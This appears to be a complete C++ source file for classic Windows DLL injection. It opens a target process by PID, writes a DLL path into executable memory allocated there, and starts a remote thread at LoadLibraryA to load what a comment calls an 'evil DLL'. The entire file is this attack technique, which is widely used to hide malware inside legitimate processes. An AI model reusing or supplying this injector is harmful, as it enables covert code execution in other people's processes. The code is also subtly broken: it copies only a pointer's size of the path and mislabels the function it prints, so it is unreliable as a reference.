/*
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main(int argc, char* argv[]) {
  HANDLE hProcess; // process handle
  HANDLE hrThread; // remote thread
  LPVOID rBuffer; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32.dll");
  VOID *fLoadLibA = GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }

   // parse process ID
   if ( strcmp(argv[2],"") == 0) {
    printf("DLL not found :( exiting...\n");
    return -1;
}
  printf("PID: %i\n", atoi(argv[1]));
  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  char *myDLL = argv[2];
  printf("DLL: %s\n", myDLL);
  unsigned int myDLLLen = sizeof(myDLL) + 1;
  printf("LoadLibraryW : 0x%x\n", fLoadLibA);

  // allocate memory buffer for remote process
  rBuffer = VirtualAllocEx(hProcess, NULL, myDLLLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  printf("Buffer address : 0x%x\n", rBuffer);
  printf("Process Handle : 0x%x\n", hProcess);

  // "copy" evil DLL between processes
  WriteProcessMemory(hProcess, rBuffer, myDLL, myDLLLen, NULL);

  // our process start new thread
  hrThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fLoadLibA, rBuffer, 0, NULL);
  CloseHandle(hProcess);
  CloseHandle(hrThread);
  return 0;
}